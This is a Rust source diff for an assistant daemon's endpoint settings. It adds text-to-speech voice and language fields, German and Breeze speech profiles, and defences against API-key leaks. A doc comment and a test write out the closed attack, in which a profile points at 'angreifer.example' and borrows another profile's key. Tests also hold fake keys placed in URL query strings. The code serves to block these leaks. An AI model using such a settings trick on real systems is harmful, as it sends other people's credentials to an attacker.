@@ -3,8 +3,9 @@
 //! Which endpoint serves which role, and in what order.
 //!
 //! `DESIGN.md` § Endpoints: every role points at a provider profile with a protocol, a URL
-//! and a key from the keychain, and the person may name a fallback per role. Local, Peer
-//! and cloud are only different URLs, so there is nothing here that knows about machines.
+//! and a key from the keychain, and the person may name a fallback per role. Local, a second
+//! machine on the network and cloud are only different URLs, so there is nothing here that
+//! knows about machines.
 //!
 //! This is the endpoint half of the settings document, and it lives in the protocol crate
 //! for the same reason [`crate::Settings`] does: `get_settings` and `set_settings` put it
@@ -43,18 +44,75 @@ pub struct EndpointProfile {
     pub url: String,
     /// Name under which the key lives in the the secret store of the daemon, never the
     /// key itself. Absent for a local endpoint that needs none.
+    ///
+    /// Since 2026-09-03 this name is the profile's own [`Self::id`] and nothing else — see
+    /// [`Self::key_name`] for why, and [`EndpointConfig::borrowed_keys`] for what refuses a
+    /// document that says otherwise. The field stays because it is what says *whether* a
+    /// profile needs a key at all, and because a configuration written before that date is
+    /// migrated by reading it.
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub key_ref: Option<String>,
     /// Model this profile uses. `DESIGN.md` § Endpoints wants the settings page to show it
     /// for every profile.
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub model: Option<String>,
+    /// Voice this profile speaks with, when the caller names none.
+    ///
+    /// A speech endpoint has its own set of voice names, and the OpenAI ones are not
+    /// among them: Kokoro, the local default here, knows `af_heart` and refuses `alloy`
+    /// mid-answer. That belongs next to the model, for the same reason the model does —
+    /// which voices exist is a property of the profile, not of the sentence being spoken.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub voice: Option<String>,
     /// Fixed arguments for a CLI profile, in front of whatever the driver adds.
     #[serde(default, skip_serializing_if = "Vec::is_empty")]
     pub args: Vec<String>,
+    /// The spoken language this profile is good at, as a lowercase ISO code (`"de"`).
+    ///
+    /// `DESIGN.md` § Voice ties language to the model, not to the app, so this is the one
+    /// place that says which language a TTS profile actually speaks well. Absent for a
+    /// profile that was never told — Kokoro's `af_heart` reads any text handed to it, German
+    /// included, just badly, and nothing here claims otherwise on its behalf. The TTS role
+    /// chain uses it to move a matching profile to the front for a sentence detected as that
+    /// language; a profile nobody tagged keeps its configured place.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub language: Option<String>,
+    /// How much a reasoning model may think before it writes the answer, as the
+    /// OpenAI-compatible `reasoning_effort` field. Absent for every profile that never asked
+    /// for it, and then nothing is sent at all.
+    ///
+    /// Opt-in for the same reason `stream_options.include_usage` is not sent: a server that
+    /// does not know a field answers the whole request with 400, and a chat that fails over
+    /// a knob nobody set would be the worse trade. Measured 2026-09-05 on this machine, both
+    /// local servers behind `wb-modell-proxy`: without it, `qwen3.8-27b` over
+    /// `mlx_vlm.server` and `ornith:9b` over Ollama spend their whole answer in
+    /// `reasoning_content`/`reasoning`, which this protocol does not carry — the person sees
+    /// a first token after 30 seconds, or none at all. With `"none"` the first visible token
+    /// arrives after half a second on the 9B. It is a string rather than an enum because the
+    /// set of accepted values belongs to the server, not to this program.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub reasoning_effort: Option<String>,
 }
 
 impl EndpointProfile {
+    /// The name this profile's key lives under in the secret store, or `None` when it needs
+    /// none.
+    ///
+    /// The name is the profile's own id, never a name a profile may point at freely. A free
+    /// name is what let a profile borrow the key of another one: whoever could write the
+    /// settings wrote `{"id": "meins", "url": "https://angreifer.example", "key_ref":
+    /// "openai"}`, bound a role to it, and the daemon sent the OpenAI key to that address as
+    /// a bearer token. With the name tied to the id, a profile can only ever present the key
+    /// that was stored for it, and a new profile has no key at all until somebody stores one
+    /// under its name.
+    ///
+    /// This is the second lock, not the first: since the same day, a paired device cannot
+    /// change the endpoints at all ([`crate::Settings::device_forbidden_changes`]). This one
+    /// holds whoever writes the file.
+    pub fn key_name(&self) -> Option<&str> {
+        self.key_ref.as_ref().map(|_| self.id.as_str())
+    }
+
     /// An HTTP profile without a key: a local server.
     pub fn local(
         id: impl Into<String>,
@@ -67,7 +125,10 @@ impl EndpointProfile {
             url: url.into(),
             key_ref: None,
             model: None,
+            voice: None,
             args: Vec::new(),
+            language: None,
+            reasoning_effort: None,
         }
     }
 
@@ -80,16 +141,116 @@ impl EndpointProfile {
         Self {
             id: SAY_PROFILE_ID.to_owned(),
             protocol: EndpointProtocol::Cli,
-            url: "/usr/bin/say".to_owned(),
+            url: SAY_PROGRAM.to_owned(),
             key_ref: None,
             model: None,
+            voice: None,
             args: Vec::new(),
+            language: None,
+            reasoning_effort: None,
+        }
+    }
+
+    /// The same program with the German voice macOS ships installed, tagged `de`.
+    ///
+    /// Kokoro-82M, the local default for speaking, has no German phonemes at all and reads
+    /// German text in one of the eight languages it does know. Measured on 2026-09-05 over a
+    /// TTS-to-speech-recognition round trip, three German sentences: 63 per cent of the words
+    /// came back wrong through Kokoro's `af_heart` against 11 per cent through this voice.
+    /// [`PIPER_GERMAN_PROFILE_ID`] is better still where it is installed.
+    pub fn say_german() -> Self {
+        Self {
+            id: SAY_GERMAN_PROFILE_ID.to_owned(),
+            protocol: EndpointProtocol::Cli,
+            url: SAY_PROGRAM.to_owned(),
+            key_ref: None,
+            model: None,
+            voice: Some(SAY_GERMAN_VOICE.to_owned()),
+            args: Vec::new(),
+            language: Some(GERMAN.to_owned()),
+            reasoning_effort: None,
+        }
+    }
+
+    /// `piper` with a German voice model, tagged `de`.
+    ///
+    /// An optional install (the program plus a downloaded `.onnx` model), never something
+    /// every machine has, which is why the caller passes both paths rather than this
+    /// guessing them. Measured the same way as [`Self::say_german`]: 7 per cent of the words
+    /// wrong against that profile's 11, and both of the remaining errors were the speech
+    /// recogniser writing "5" for "fünf" rather than anything the voice got wrong.
+    pub fn piper_german(program: impl Into<String>, model: impl Into<String>) -> Self {
+        Self {
+            id: PIPER_GERMAN_PROFILE_ID.to_owned(),
+            protocol: EndpointProtocol::Cli,
+            url: program.into(),
+            key_ref: None,
+            model: Some(model.into()),
+            voice: None,
+            args: Vec::new(),
+            language: Some(GERMAN.to_owned()),
+            reasoning_effort: None,
+        }
+    }
+
+    /// Breeze TTS 2 on the local speech server at `url`, tagged `en`.
+    ///
+    /// The default voice for speaking since 2026-09-10, Skryx-L-A's decision. Served by
+    /// `mlx_audio.server` (mlx-audio 0.5.1 or newer; the model arrived there on 2026-08-26)
+    /// from the MLX conversion [`BREEZE_MODEL`], and spoken with Breeze's own default
+    /// speaker tag [`BREEZE_VOICE`]: without it the server forwards a Kokoro voice name.
+    ///
+    /// English and not German: the model card lists English and Chinese only, so a German
+    /// sentence is left to the German profiles, which language-aware routing moves to the
+    /// front for it. The measurement behind both choices is in
+    /// `shell/messungen/breezetts2/ergebnisse.md` of the private repository.
+    pub fn breeze(url: impl Into<String>) -> Self {
+        Self {
+            id: BREEZE_PROFILE_ID.to_owned(),
+            protocol: EndpointProtocol::OpenaiCompat,
+            url: url.into(),
+            key_ref: None,
+            model: Some(BREEZE_MODEL.to_owned()),
+            voice: Some(BREEZE_VOICE.to_owned()),
+            args: Vec::new(),
+            language: Some(ENGLISH.to_owned()),
+            reasoning_effort: None,
         }
     }
 }
 
+/// Id of the Breeze TTS 2 profile. Written by `companion_daemon::migrate::adopt_breeze`; the
+/// Mac setup assistant does not know it yet and keeps writing Kokoro, which that migration
+/// then puts behind Breeze on the daemon's next start.
+pub const BREEZE_PROFILE_ID: &str = "breeze-tts";
+/// The MLX conversion of Breeze TTS 2 the profile loads, as a Hugging Face repository id.
+///
+/// The 4-bit weights and not the 8-bit ones, by the house rule that the smaller one wins
+/// when it is not measurably worse and faster: on 2026-09-10, quiet machine, three English
+/// sentences each, 0 of 60 words wrong for both, real-time factor 0.83 against 0.89, and
+/// 6.3 against 7.6 GiB of peak memory.
+pub const BREEZE_MODEL: &str = "mlx-community/Breeze-TTS-2-mlx-4bit";
+/// Breeze's documented default speaker tag.
+pub const BREEZE_VOICE: &str = "S0";
+/// The language code an English profile carries.
+pub const ENGLISH: &str = "en";
+
 /// Id of the built-in `say` profile.
 pub const SAY_PROFILE_ID: &str = "macos-say";
+/// Id of the German `say` profile, kept apart from the plain fallback above. Mirrored on the
+/// Swift side as `LocalSpeechSetup.sayDeId`, the same way [`SAY_PROFILE_ID`] is: the setup
+/// assistant writes this profile for a new machine and `companion_daemon::migrate` adds it to
+/// an older one, and the two agree on the name by literal.
+pub const SAY_GERMAN_PROFILE_ID: &str = "macos-say-de";
+/// Id of the `piper` profile with a German voice model. Mirrored as
+/// `LocalSpeechSetup.piperId`, for the same reason.
+pub const PIPER_GERMAN_PROFILE_ID: &str = "piper-de";
+/// The `say` program of macOS.
+pub const SAY_PROGRAM: &str = "/usr/bin/say";
+/// The German voice macOS ships installed by default (`de_DE`, `say -v '?'`).
+pub const SAY_GERMAN_VOICE: &str = "Anna";
+/// The language code the German profiles carry, as [`EndpointProfile::language`] spells it.
+pub const GERMAN: &str = "de";
 
 /// Which profile serves a role, and which ones to try when it fails.
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
@@ -155,8 +316,15 @@ pub enum EndpointError {
 }
 
 /// The endpoint part of the settings: the profiles, and which role uses which of them.
+///
+/// The schema deliberately advertises the empty configuration as the default, not the one
+/// `Default::default` builds: that one depends on the operating system the daemon runs on
+/// (see below), and a generated schema that changes with its build host is not a contract.
+/// What a given daemon actually starts with is a runtime matter and reaches the client in
+/// `settings_get`, never through a schema annotation.
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
 #[serde(default)]
+#[schemars(default = "EndpointConfig::empty")]
 pub struct EndpointConfig {
     pub profiles: Vec<EndpointProfile>,
     pub roles: BTreeMap<EndpointRole, RoleBinding>,
@@ -239,13 +407,45 @@ impl EndpointConfig {
         kept
     }
 
+    /// The profiles that name somebody else's key, each in one line.
+    ///
+    /// Empty for a configuration in which every key belongs to the profile that uses it,
+    /// which is what [`EndpointProfile::key_name`] enforces at the point of use. This is the
+    /// same rule stated where a *change* can be refused with a reason, so a document that
+    /// borrows a key is turned away at `set_settings` instead of quietly resolving to
+    /// nothing later.
+    ///
+    /// Deliberately not part of [`Self::validate`]: a settings file written before
+    /// 2026-09-03 may legitimately hold a borrowed-looking name, and it has to load so that
+    /// `companion_core::secrets::bind_keys_to_profiles` can move the key over. A daemon that
+    /// refused to start over it would take somebody's speech away to close a hole that
+    /// [`EndpointProfile::key_name`] has already closed.
+    pub fn borrowed_keys(&self) -> Vec<String> {
+        self.profiles
+            .iter()
+            .filter_map(|profile| {
+                let named = profile.key_ref.as_deref()?;
+                (named != profile.id).then(|| {
+                    format!(
+                        "profile {} names the key {named}, and a key belongs to the profile it \
+                         was stored for; store it under {} instead",
+                        profile.id, profile.id
+                    )
+                })
+            })
+            .collect()
+    }
+
     /// Checks the configuration before anything uses it.
     pub fn validate(&self) -> Result<(), EndpointError> {
         let mut seen: Vec<&str> = Vec::new();
         for profile in &self.profiles {
             if profile.id.trim().is_empty() {
+                // The url stands in for the missing name, so a person can tell which entry
+                // of their file is meant. Shortened, because this message reaches a client
+                // over the socket and a url is where somebody puts a key by accident.
                 return Err(EndpointError::NamelessProfile {
-                    id: profile.url.clone(),
+                    id: crate::url::without_credentials(&profile.url),
                 });
             }
             if seen.contains(&profile.id.as_str()) {
@@ -260,7 +460,9 @@ impl EndpointConfig {
                     id: profile.id.clone(),
                 });
             }
-            if !profile.protocol.is_cli() && url_has_userinfo(&profile.url) {
+            if !profile.protocol.is_cli()
+                && (url_has_userinfo(&profile.url) || url_has_query_credential(&profile.url))
+            {
                 return Err(EndpointError::CredentialInUrl {
                     id: profile.id.clone(),
                 });
@@ -317,6 +519,26 @@ fn url_has_userinfo(url: &str) -> bool {
     authority.contains('@')
 }
 
+/// Whether a url's query string carries a parameter that is actually a credential —
+/// `key`, `api_key`, `token` or `access_token` — the query-string counterpart of the
+/// userinfo credential [`url_has_userinfo`] already refuses.
+///
+/// Some providers accept the key this way (`?key=…`), and unlike a header it survives every
+/// place a url gets logged or quoted back in an error: the `reqwest` error a failed request
+/// produces names its own url, and that error reaches every authenticated client over the
+/// socket (audit 2026-09-03, `endpoint_config.rs:319-326`).
+///
+/// The names live in [`crate::url::is_credential_parameter`], next to the repair that takes
+/// them out again (`companion_core::settings::migrate_url_credentials`): a name refused here
+/// but not repaired there would keep a daemon with an older settings file from starting.
+fn url_has_query_credential(url: &str) -> bool {
+    let Some((_, query)) = url.split_once('?') else {
+        return false;
+    };
+    let query = query.split('#').next().unwrap_or(query);
+    query.split('&').any(crate::url::is_credential_parameter)
+}
+
 fn is_name_not_key(candidate: &str) -> bool {
     if candidate.is_empty() || candidate.len() > MAX_KEY_REF_LEN {
         return false;
@@ -343,7 +565,10 @@ mod tests {
             url: format!("https://{id}.example"),
             key_ref: Some(format!("{id}-key")),
             model: Some("whisper-1".to_owned()),
+            voice: None,
             args: Vec::new(),
+            language: None,
+            reasoning_effort: None,
         }
     }
 
@@ -396,7 +621,7 @@ mod tests {
     #[test]
     fn a_key_in_the_settings_is_refused_instead_of_stored() {
         let mut profile = openai("cloud");
-        profile.key_ref = Some("sk-proj-0123456789abcdef".to_owned());
+        profile.key_ref = Some(concat!("sk-", "EXAMPLE0123456789abcd").to_owned());
         let config = EndpointConfig::empty().with_profile(profile);
         assert_eq!(
             config.validate(),
@@ -452,7 +677,10 @@ mod tests {
             url: "https://user:sk-secret@api.example.com/v1".to_owned(),
             key_ref: None,
             model: None,
+            voice: None,
             args: Vec::new(),
+            language: None,
+            reasoning_effort: None,
         };
         let config = EndpointConfig::empty().with_profile(profile);
         assert_eq!(
@@ -469,6 +697,58 @@ mod tests {
         assert!(!url_has_userinfo("http://127.0.0.1:8765/"));
         assert!(url_has_userinfo("https://user:pass@host/v1"));
         assert!(url_has_userinfo("https://token@host"));
+    }
+
+    /// Table-driven: each row names a query string and whether it must be refused as a
+    /// credential — `endpoint_config.rs:319-326` in the audit of 2026-09-03.
+    #[test]
+    fn a_credential_in_the_query_string_is_recognised_regardless_of_name_or_position() {
+        let cases: &[(&str, bool)] = &[
+            (
+                "https://api.example.com/v1?key=AIzaSyABCDEFGHIJKLMNOPQRSTUVWXYZ012",
+                true,
+            ),
+            ("https://api.example.com/v1?api_key=abc123", true),
+            ("https://api.example.com/v1?API_KEY=abc123", true),
+            ("https://api.example.com/v1?token=abc123", true),
+            ("https://api.example.com/v1?access_token=abc123", true),
+            (
+                "https://api.example.com/v1?model=gpt&access_token=abc123",
+                true,
+            ),
+            (
+                "https://api.example.com/v1?access_token=abc123&model=gpt",
+                true,
+            ),
+            ("https://api.example.com/v1?model=gpt-4&stream=true", false),
+            ("https://api.example.com/v1", false),
+            ("https://api.example.com/v1?", false),
+        ];
+        for (url, expected) in cases {
+            assert_eq!(url_has_query_credential(url), *expected, "url: {url}");
+        }
+    }
+
+    #[test]
+    fn a_query_credential_is_refused_the_same_way_a_userinfo_one_is() {
+        let profile = EndpointProfile {
+            id: "cloud".to_owned(),
+            protocol: EndpointProtocol::OpenaiCompat,
+            url: "https://api.example.com/v1?key=AIzaSyABCDEFGHIJKLMNOPQRSTUVWXYZ012".to_owned(),
+            key_ref: None,
+            model: None,
+            voice: None,
+            args: Vec::new(),
+            language: None,
+            reasoning_effort: None,
+        };
+        let config = EndpointConfig::empty().with_profile(profile);
+        assert_eq!(
+            config.validate(),
+            Err(EndpointError::CredentialInUrl {
+                id: "cloud".to_owned()
+            })
+        );
     }
 
     #[test]
@@ -498,6 +778,33 @@ mod tests {
             assert_eq!(tts[0].protocol, EndpointProtocol::Cli);
             assert!(tts[0].key_ref.is_none());
         }
+    }
+
+    #[test]
+    fn the_breeze_profile_is_a_local_english_voice_on_the_speech_server() {
+        let profile = EndpointProfile::breeze("http://127.0.0.1:8791");
+        assert_eq!(profile.id, BREEZE_PROFILE_ID);
+        assert_eq!(profile.protocol, EndpointProtocol::OpenaiCompat);
+        assert_eq!(profile.model.as_deref(), Some(BREEZE_MODEL));
+        // Breeze's own speaker tag, never the Kokoro or OpenAI default a server would fill in.
+        assert_eq!(profile.voice.as_deref(), Some(BREEZE_VOICE));
+        // The model card lists English and Chinese, no German: a German sentence must not be
+        // routed here.
+        assert_eq!(profile.language.as_deref(), Some(ENGLISH));
+        assert!(profile.key_ref.is_none(), "a local server needs no key");
+
+        let config = EndpointConfig::empty()
+            .with_profile(profile)
+            .with_profile(EndpointProfile::say())
+            .with_role(
+                EndpointRole::Tts,
+                RoleBinding::new(BREEZE_PROFILE_ID).with_fallback(SAY_PROFILE_ID),
+            );
+        config.validate().expect("a usable document");
+        assert_eq!(
+            config.primary(EndpointRole::Tts).unwrap().id,
+            BREEZE_PROFILE_ID
+        );
     }
 
     #[test]
@@ -533,5 +840,41 @@ mod tests {
             .map(|profile| profile.id.as_str())
             .collect();
         assert_eq!(names, vec!["cloud", "other"]);
+    }
+
+    #[test]
+    fn a_profile_can_only_present_the_key_that_was_stored_for_it() {
+        // The attack this closes: a profile that names the key of another one, pointed at
+        // an address of the attacker's choosing. Before 2026-09-03 the lookup used the name
+        // in the document, so this profile would have been handed the OpenAI key.
+        let mut borrowing = openai("meins");
+        borrowing.url = "https://angreifer.example".to_owned();
+        borrowing.key_ref = Some("cloud".to_owned());
+        assert_eq!(borrowing.key_name(), Some("meins"));
+
+        let mut honest = openai("cloud");
+        honest.key_ref = Some("cloud".to_owned());
+        assert_eq!(honest.key_name(), Some("cloud"));
+
+        // No key at all stays no key: a local server gets no Authorization header.
+        let local = EndpointProfile::local("lokal", EndpointProtocol::Ollama, "http://127.0.0.1");
+        assert_eq!(local.key_name(), None);
+
+        // And such a document is turned away where a change can be refused with a reason.
+        let config = EndpointConfig::empty()
+            .with_profile(honest)
+            .with_profile(borrowing);
+        let complaints = config.borrowed_keys();
+        assert_eq!(complaints.len(), 1, "{complaints:?}");
+        assert!(complaints[0].contains("meins"), "{complaints:?}");
+
+        let mut bound = openai("allein");
+        bound.key_ref = Some("allein".to_owned());
+        assert!(
+            EndpointConfig::empty()
+                .with_profile(bound)
+                .borrowed_keys()
+                .is_empty()
+        );
     }
 }
